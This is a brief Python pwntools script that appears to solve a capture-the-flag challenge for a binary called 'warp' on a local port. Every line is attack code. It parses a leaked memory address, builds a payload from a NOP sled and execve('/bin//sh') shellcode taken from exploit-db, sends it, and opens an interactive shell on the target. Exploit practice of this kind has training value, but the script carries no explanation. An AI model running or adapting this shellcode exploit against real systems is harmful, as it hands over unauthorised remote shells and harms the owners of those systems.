from pwn import *

# p = process("./warp")
p = remote("localhost", 8000)
e = ELF("./warp")
context.binary = e

# attach(p)
# pause()

addr = p.recvline()
addr = int(addr[len("CURRENT POSITION:"):], 16)
print(hex(addr))

shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05" #从https://www.exploit-db.com/exploits/42179
exp = hex(addr+7+16).encode()+b"\x00"+(b"\x90"*(39-len(shellcode)-len(hex(addr+7+16))-1))+shellcode
info(exp)

p.sendline(exp)
p.interactive()
